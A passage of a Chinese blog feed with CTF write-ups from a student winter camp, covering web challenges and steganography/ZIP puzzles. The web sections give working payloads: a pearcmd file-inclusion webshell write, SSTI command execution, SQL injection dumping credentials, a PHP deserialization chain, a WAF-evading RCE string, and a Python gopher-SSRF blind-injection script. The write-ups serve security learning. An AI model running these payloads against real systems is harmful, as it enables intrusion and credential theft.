+<p>春节期间比我想得要忙，也没做几道题，只能写点浅显的东西勉勉强强这样子。。。</p>
+<h4 id="2023-x2F-01-x2F-26-学习-amp-amp-尝试-1"><a href="#2023-x2F-01-x2F-26-学习-amp-amp-尝试-1" class="headerlink" title="2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;26 学习&amp;&amp;尝试</h4><p><strong>[Week2]double_cmd</strong></p>
+<ol>
+<li><code>cmd=flflagag</code>双写绕过</li>
+</ol>
+<blockquote>
+<p>没有结果是因为<code>include($cmd)</code>中cmd&#x3D;flag的flag是在网站目录的，而网站目录会显示404，说明flag应该是在根目录情况下</p>
+</blockquote>
+<ol start="2">
+<li><code>cmd=/flflagag</code>绝对路径看看,但是无事发生</li>
+</ol>
+<blockquote>
+<p>绝对路径是指文件或文件夹在计算机系统中的完整路径，它包括所有父文件夹的名称，以及最后的文件或文件夹的名称</p>
+</blockquote>
+<ol start="3">
+<li>由题意得，可以用PHP伪协议绕过<code>cmd=php://filter/convert.base64-encode/resource=/flaflagg</code></li>
+</ol>
+<blockquote>
+<p>PHP伪协议是一种用于从服务器获取文件的协议，它允许用户以URL的形式从服务器中读取文件，而无需使用FTP或其他文件传输协议。PHP伪协议使用“php:&#x2F;&#x2F;”作为URL的前缀，以便能够识别它。<br><code>?file=php://filter/convert.base64-encode/resource=index.php</code><br>php:&#x2F;&#x2F;filter&#x2F;是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode&#x2F;表示读取的方式是base64编码，resource&#x3D;index.php表示目标文件为index.php。</p>
+</blockquote>
+<h4 id="2023-x2F-01-x2F-27-学习-amp-amp-尝试-2"><a href="#2023-x2F-01-x2F-27-学习-amp-amp-尝试-2" class="headerlink" title="2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试"></a>2023&#x2F;01&#x2F;27 学习&amp;&amp;尝试</h4><p><strong>[Week2]double_cmd_plus</strong><br>等等。。还在捋。。。。。。。。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?+config-create+/&amp;/&lt;?=eval($_POST[123])?&gt;+/tmp/hello.php HTTP/1.1</span><br><span class="line">cmd=flaflagg/../../../../../../../../../../../../usr/local/lib/php/pearcmd.php</span><br><span class="line"></span><br><span class="line">http://101.43.57.52:28084/index.php</span><br><span class="line">cmd=flflagag/../../../../../../../../../../../../tmp/hello.php&amp;123=system(&quot;/readflag&quot;);</span><br></pre></td></tr></table></figure>
+<p>按视频做法走了一遍大概是这样。。。让我捋捋。。让我捋捋。。。。。。。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Week2-八重神子的尾巴"><a href="#Week2-八重神子的尾巴" class="headerlink" title="[Week2]八重神子的尾巴"></a>[Week2]八重神子的尾巴</h3><p>Winhex，最后面，flag</p>
+<h3 id="Week2-扫雷"><a href="#Week2-扫雷" class="headerlink" title="[Week2]扫雷"></a>[Week2]扫雷</h3><p>我不知道预期解法是什么样的，反正我老老实实扫了两小时雷，扫完出来看得出来是张二维码，但是扫不出来；然后电脑找个画像素画的网站，一格一格涂出来，然后，扫。</p>
+<h3 id="Week2-爱门！"><a href="#Week2-爱门！" class="headerlink" title="[Week2]爱门！"></a>[Week2]爱门！</h3><p>由题意得，是PNG图片格式隐写，把图片高度改高即可。<br>Winhex打开</p>
+<blockquote>
+<p><strong>00-07</strong> 89 50 4E 47 0D 0A 1A 0A 固定<br><strong>08-0B</strong> 标识IHDR区的大小<br><strong>0C-0F</strong> 49 48 44 52 固定（IHDR区）<br><strong>10-13</strong> 图片宽度<br><strong>14-17</strong> 图片高度（本题就是改这里改大就好</p>
+</blockquote>
+<h3 id="Week2-真的加密了吗？"><a href="#Week2-真的加密了吗？" class="headerlink" title="[Week2]真的加密了吗？"></a>[Week2]真的加密了吗？</h3><p>伪加密，09改回00即可。<br>Winhex打开</p>
+<blockquote>
+<p><strong>压缩源文件数据区：</strong><br>50 4B 03 04 头文件标记<br>14 00 解压文件所需 pkware 版本<br>00 00 全局加密（改这里</p>
+</blockquote>
+<blockquote>
+<p><strong>压缩源文件目录区：</strong><br>50 4B 01 02 目录中文件文件头标记<br>3F 00 压缩使用的 pkware 版本<br>14 00 解压文件所需 pkware 版本<br>00 00 全局方式位标记（还有这里<br>↑↑↑↑↑↑↑↑改这个会显示是否有密码</p>
+</blockquote>
+<blockquote>
+<p><strong>压缩源文件目录结束标志：</strong><br>50 4B 05 06 目录结束标记 </p>
+</blockquote>
+<h3 id="Week2-guess"><a href="#Week2-guess" class="headerlink" title="[Week2]guess"></a>[Week2]guess</h3><p>我觉得根据题意显然是爆破，但是。。。。我爆破了三天，用了各种组合（belike：6位内所有字符；8位内大小写字母，7位内大小写字母加数字，10位数字等等等等等等等）出来了三个密码，输进去打开文件全是乱码，第四天电脑趁我挂机偷偷更新，重启打开都不知道爆破到哪里去了，遂作罢。</p>
+<p>（2023年1月25日22点23分：吗吖怎么真靠猜啊。。第一排字母。。确实是很简单。。理是这个理没错。。但是。。但是。。好吧是弱密码爆破倒也没错。。。。。。<br>（2023年1月25日22点26分：说起来我怎么没想到用十位小写字母爆破一下，没准爆个两天也爆出来了呢（在口嗨</p>
+<h3 id="Week2-透视"><a href="#Week2-透视" class="headerlink" title="[Week2]透视?"></a>[Week2]透视?</h3><p>打开压缩包发现5个TXT文件大小分别为16，15，18，16，17字节刚好满足crc32暴破的条件（小于等于18）。<br>遂采用crc32爆破</p>
+<p>很不巧本人还不会用python写脚本爆破，上网找了个CRC32爆破工具<br><a href="https://github.com/theonlypwner/crc32">https://github.com/theonlypwner/crc32</a><br>使用方法：<code>python crc32.py reverse 0x（crc32密文）</code><br>这个工具可以解4字节和6字节的字符串，然而不幸的事情又发生了，这玩意儿里面还有一个3字节和一个5字节，网上找了个别人的代码<br><a href="https://blog.csdn.net/WFC1006848997/article/details/110295708">CRC32碰撞脚本（1-5字节）</a><br>5字节有点慢，不过能凑合着用。</p>
+<p>最后一个个解出来拼在一起，就是flag。</p>
+]]></content>
+      <categories>
+        <category>做题记录</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>web</tag>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ROIS冬令营第三周至第五周WriteUp</title>
+    <url>/2023/02/15/ROIS%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%B8%89%E5%91%A8%E8%87%B3%E7%AC%AC%E4%BA%94%E5%91%A8WriteUp/</url>
+    <content><![CDATA[<p>ROIS冬令营第三周至第五周WriteUp（更了misc的两题</p>
+<span id="more"></span>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Week3-SSTItest"><a href="#Week3-SSTItest" class="headerlink" title="[Week3]SSTItest"></a>[Week3]SSTItest</h3><p>payload：<code>username=&#123;&#123;lipsum.__globals__["os"].popen("tac ../flag").read()&#125;&#125;&amp;password=1</code></p>
+<h3 id="LinTu的留言板sql注入"><a href="#LinTu的留言板sql注入" class="headerlink" title="LinTu的留言板sql注入"></a>LinTu的留言板sql注入</h3><p>测试（以下第一行都在id处输入，第二行都在留言处输入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,&#x27;2&#x27;)#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
+<p>输出：<code>1 说 2</code></p>
+<p>查当前库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,database())#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
+<p>输出：<code>1 说 test</code></p>
+<p>查库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,(select group_concat(schema_name) from information_schema.schemata))#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
+<p>输出：<code>1 说 mysql,information_schema,performance_schema,sys,sakila,world,test</code></p>
+<p>查表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test&#x27;))#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
+<p>输出：<code>1 说 guestbook,user</code></p>
+<p>查字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;,(select group_concat(concat_ws(&#x27;:&#x27;,username,password)) from test.user))#</span><br><span class="line">11</span><br></pre></td></tr></table></figure>
+<p>输出admin及其密码</p>
+<h3 id="Week4-babyphp"><a href="#Week4-babyphp" class="headerlink" title="[Week4]babyphp"></a>[Week4]babyphp</h3><p>刚开头给的函数是backdoor函数，传入六个参数，但是在下面的代码里面，除了在popko类中，其他的并没有调用这个backdoor函数<br>由题意得，我们应该用到这个backdoor函数</p>
+<p>按顺序捋捋应该是：</p>
+<ol>
+<li>首先是传入一个c，当c中不包含字符串<code>popko</code>，就会反序列化c中的字符串；</li>
+<li>反序列化后会调用popko类中的__destruct函数；</li>
+<li>popko类中的__destruct函数中又会调用pipimi类中的__destruct函数；</li>
+<li>__destruct函数中会调用backdoor函数；</li>
+</ol>
+<hr>
+<ol>
+<li><p>首先，构造一个可以被反序列化的字符串c，利用反序列化漏洞，构造一个可以调用backdoor()函数的对象，利用 Popko 类，Popko类有一个 __call() 函数，当left和right值相同，且md5和sha1值相同，它会调用backdoor()函数。</p>
+</li>
+<li><p>然后，利用 pipimi 类，构造一个可以调用 Popko 类的对象，利用 pipimi 类来构造，调用 Popko 类的 a 函数，从而调用 Popko 类的 __call() 函数。</p>
+</li>
+<li><p>然后，构造出c后就可以调用backdoor()函数；</p>
+</li>
+</ol>
+<p>构造c</p>
+<ol>
+<li>传入popkp：php是一种弱语言，strstr()对大小写敏感，可以用Popko大写绕过这样。。</li>
+<li>left和right值相同，且md5和sha1值相同：数组传参；</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$popko=new popko();</span><br><span class="line">$pipimi=new pipimi();</span><br><span class="line">$right[]=1;</span><br><span class="line">$left[]=2;</span><br><span class="line">$popko-&gt;right=$right;</span><br><span class="line">$popko-&gt;left=$left;</span><br><span class="line">$pipimi-&gt;a=$popko;</span><br><span class="line">echo serialize($pipimi);</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>得到<code>O:6:&quot;pipimi&quot;:1:&#123;s:1:&quot;a&quot;;O:5:&quot;popko&quot;:2:&#123;s:4:&quot;left&quot;;a:1:&#123;i:0;i:2;&#125;s:5:&quot;right&quot;;a:1:&#123;i:0;i:1;&#125;&#125;&#125;</code>改<code>POPKO</code></li>
+<li>绕过__wakeup()：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，2改3；</li>
+<li>成功调用backdoor函数。</li>
+</ol>
+<hr>
+<ol>
+<li><p><code>&amp;a=Error</code>Error类；</p>
+</li>
+<li><p><code>&amp;b=systemcat%20/f*</code>指定b的值为systemcat &#x2F;f*，这是一个命令，它会搜索当前目录下所有以.f结尾的文件。</p>
+</li>
+<li><p><code>&amp;d=7&amp;e=6&amp;f=13&amp;g=7</code>指定d，e，f和g的值为7，6，13和7，它们是用来指定Popko类的实例的left和right属性的字符串长度的。</p>
+</li>
+</ol>
+<p><code>?c=O:6:&quot;pipimi&quot;:1:&#123;s:1:&quot;a&quot;;O:5:&quot;POPKO&quot;:3:&#123;s:4:&quot;left&quot;;a:1:&#123;i:0;i:1;&#125;s:5:&quot;right&quot;;a:1:&#123;i:0;i:2;&#125;&#125;&#125;&amp;a=Error&amp;b=systemcat%20/f*&amp;d=7&amp;e=6&amp;f=13&amp;g=7</code></p>
+<h3 id="Week4-cachewaf"><a href="#Week4-cachewaf" class="headerlink" title="[Week4]cachewaf"></a>[Week4]cachewaf</h3><p>&#96;cmd&#x3D;system(‘ls’);发现被过滤，经过测试是system被过滤。</p>
+<p>搜个无数字字母rce的，<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=echo 1111;</code></p>
+<p>然后<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=ls /</code>把&#x2F;目录下的文件和目录列出来。</p>
+<p>但是在<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=cat /f*</code>提取flag时，flag是错的。</p>
+<p>输入<code>cmd=$%DF=(_/_._)[0];$_=%2B%2B$%DF ;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B ;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE [0]($$%DE [_]);&amp;0=system&amp;_=cat waf*</code>发现flag会被替换并且被编码。</p>
+<p>。。。然后。。。利用shelI写文件绕过waf这部分还在捋捋。。。但是看到了wp给出的非预期解（？）。。。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=echo `ls /`;</span><br><span class="line">cmd=echo `cat /f?ag`;</span><br><span class="line">cmd=echo bin2hex(`cat /f?ag`);</span><br></pre></td></tr></table></figure>
+<p>然后hex解一下就好</p>
+<h3 id="Week4-internal"><a href="#Week4-internal" class="headerlink" title="[Week4]internal"></a>[Week4]internal</h3><p>由sqli可以知道真实的地址要在它服务端本地发出的，才能够进行sql查询。。<br>由ssrf提示可得，可以利用gopher协议，构造一个数据包然后传进去，使服务器以为是本地发送的请求。<br>构建如下：<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2</code></p>
+<p>然后利用id进行传参。。</p>
+<p>空格可以用<code>/**/</code>替换，但是不知道为什么我<code>&quot;un&quot;+&quot;ion&quot;</code>构建不成功，试了大小写双写内联注释URL编码都不行。。。好吧只能一个一个布尔盲注一下<br><strong>查库名</strong><br>库名长度为3<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(length(database())=3)</code></p>
+<p>库名第一个字符ASCII值为114(r)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(ASCII(SUBSTR(database(),1,1))=114)</code></p>
+<p>同理可得,第二个字符是(u)，第三个是(a)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(ASCII(SUBSTR(database(),2,1))=117)</code></p>
+<p><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(ASCII(SUBSTR(database(),3,1))=97)</code></p>
+<p>即，数据库名为rua。</p>
+<p><strong>查表名</strong><br>求当前数据库存在的表的数量<br>当前数据库存在2个表<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(select/**/count(table_name)/**/from/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database())/**/=/**/2</code></p>
+<p>查表长度，为4<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(LENGTH((select/**/table_name/**/from/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1)/**/))/**/=/**/4</code></p>
+<p>表名第一个字符ASCII值为102(f)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),1,1))=102</code></p>
+<p>同理可得，第二个字符是(l)，第三个是(a)，第四个是(g)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),2,1))=108</code></p>
+<p><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),3,1))=97</code></p>
+<p><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/table_name/**/FROM/**/information_schema.`TABLES`/**/where/**/table_schema/**/=/**/database()/**/LIMIT/**/0,1),4,1))=103</code></p>
+<p>即，表名是flag。</p>
+<p><strong>求列名</strong><br>求表中列的数量(1个)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(select/**/count(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&quot;flag&quot;)/**/=/**/1</code></p>
+<p>求表中列的长度，4有输出5没有，所以长度是4<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&quot;flag&quot;/**/limit/**/0,1),4,1))</code></p>
+<p>第一个字母ASCII值为102(f)<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name/**/=/**/&quot;flag&quot;/**/limit/**/0,1),1,1))=102</code><br>同理，列名是flag</p>
+<p><strong>求字段</strong><br>求字段数，只有一个。。。很好<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/(select/**/count(flag)/**/from/**/flag)=1</code></p>
+<p>求字段长度，24有输出25没有，所以长度是24<br><code>url=gopher://127.0.0.1:80/_POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%25202100%250D%250A%250D%250Aid=2/**/and/**/ASCII(SUBSTR((select/**/flag/**/from/**/flag/**/limit/**/0,1),24,1))</code></p>
+<p>然后。。就一个一个的字符的。。试。。或者burp爆破。。再动上一点小脑筋。。。。<br>24个字符扣掉<code>ROIS&#123;&#125;</code>还有18个。。没有很多。。<br><img src="https://img.mjj.today/2023/02/11/b244fea670d1fd320360c67fd6e2fb96.png" alt="b244fea670d1fd320360c67fd6e2fb96.png"><br>最后解得flag的值</p>
+<p>学长给了个python的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="comment">#导入urllib.parse模块，用于对url进行编码</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#导入requests模块，用于发送http请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fuck</span>():</span><br><span class="line"><span class="comment">#定义一个函数，名称为fuck</span></span><br><span class="line">    url = <span class="string">&quot;http://101.43.57.52:43083/curl.php&quot;</span></span><br><span class="line">    <span class="comment">#定义一个url变量，用于存储要发送请求的url</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment">#定义一个result变量，用于存储最终查询到的结果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">    <span class="comment">#使用for循环，循环次数为1290次，循环变量i从1开始</span></span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        <span class="comment">#定义一个head变量，用于存储字符的ASCII码的范围，初始值为32，对应空格</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        <span class="comment">#定义一个tail变量，用于存储字符的ASCII码的范围，初始值为127，对应~</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        <span class="comment">#使用while循环，当head小于tail时，循环继续</span></span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="comment">#定义一个mid变量，用于存储字符的ASCII码的中间值，等于head和tail的平均值</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查库名</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;rua&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查表名</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查列名</span></span><br><span class="line">            sqli = <span class="string">&quot;1/**/and/**/if(ascii(substr((seLect(flag)from(rua.flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            <span class="comment">#查字段</span></span><br><span class="line">            <span class="built_in">id</span> = urllib.parse.quote(sqli)</span><br><span class="line">            <span class="comment">#使用urllib.parse.quote方法对sqli变量进行编码</span></span><br><span class="line">            id_length = <span class="built_in">len</span>(<span class="built_in">id</span>)+<span class="number">3</span></span><br><span class="line">            <span class="comment">#定义一个id_length变量，用于存储编码后的sqli语句的长度</span></span><br><span class="line">            payload = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /sqli.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;id_length&#125;</span></span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#定义一个payload变量，用于存储构造的http请求</span></span><br><span class="line"><span class="comment"># print(payload)：打印payload变量，用于查看构造的http请求</span></span><br><span class="line">            tmp = urllib.parse.quote(payload)</span><br><span class="line">            <span class="comment">#使用urllib.parse.quote方法对payload变量进行编码</span></span><br><span class="line">            new = tmp.replace(<span class="string">&quot;%0A&quot;</span>,<span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line">            <span class="comment">#使用replace方法对编码后的payload变量进行替换，将%0A替换为%0D%0A</span></span><br><span class="line">            res = <span class="string">&#x27;gopher://127.0.0.1:80/_&#x27;</span> + new</span><br><span class="line">            <span class="comment">#定义一个res变量，用于存储替换后的payload变量</span></span><br><span class="line">            dataa = &#123;</span><br><span class="line">                <span class="string">&quot;url&quot;</span>:res</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#定义一个dataa变量，用于存储要发送的数据</span></span><br><span class="line">            r = requests.post(url=url,data=dataa)</span><br><span class="line">            <span class="comment">#使用requests.post方法发送http请求，url参数为url变量，data参数为dataa变量</span></span><br><span class="line">            <span class="comment"># print(r.text)：打印r.text，用于查看返回的内容</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;meow meow meow&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment">#如果返回内容中包含&quot;meow meow meow&quot;字符串，则执行if语句中的内容</span></span><br><span class="line">                head=mid+<span class="number">1</span></span><br><span class="line">                <span class="comment">#将head变量设置为mid+1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#如果返回内容中不包含&quot;meow meow meow&quot;字符串，则执行else语句中的内容</span></span><br><span class="line">                tail=mid</span><br><span class="line">                <span class="comment">#将tail变量设置为mid</span></span><br><span class="line">        <span class="keyword">if</span> head !=<span class="number">32</span>:</span><br><span class="line">        <span class="comment">#如果head变量不等于32，则执行if语句中的内容</span></span><br><span class="line">            result+=<span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="comment">#将head变量对应的字符添加到result变量中</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#如果head变量等于32，则执行else语句中的内容</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#跳出for循环</span></span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="comment">#打印result变量，用于查看最终查询到的结果</span></span><br><span class="line">fuck()</span><br><span class="line"><span class="comment">#执行fuck函数</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="福到了"><a href="#福到了" class="headerlink" title="福到了"></a>福到了</h3><ol>
+<li>png图片用winhex或010 Editor打开，可以在最末端IEND区后发现一个<code>DM</code>（但是因为不知道怎么用，很长一段时间没重视它（</li>
+<li>Stegsolve可以看到R、G、B的0通道左上角和下面一排均有隐写痕迹，根据提取出来的<code>fudaole</code>的信息，可得，将图片翻转（这图不仅倒了还反了。。</li>
+<li>翻转后再次用Stegsolve打开，r0&#x2F;g0&#x2F;b0均有504B开头数据，是zip文件头格式，保存为zip，打开压缩包，里面是一个叫binary的文件</li>
+<li>学长给了hint是<code>DM</code>是个缩写，和一个关键词：“barcode”</li>
+<li>可以联系到DM是DataMatrix的缩写</li>
+<li>用winhex打开binary，观察十六进制数值可以发现开头是<code>AAAA..</code>结尾是<code>FFFF..</code></li>
+<li>文件名联想二进制转换可得开头是<code>101010..</code>结尾是<code>111111..</code></li>
+<li>研究DataMatrix形式可得其最上面一行和最右边一行是黑白格相间，最下面一行和最左边一行是全黑格，跟二进制数值有相符的地方，由此推测出用二进制绘制DataMatrix</li>
+</ol>
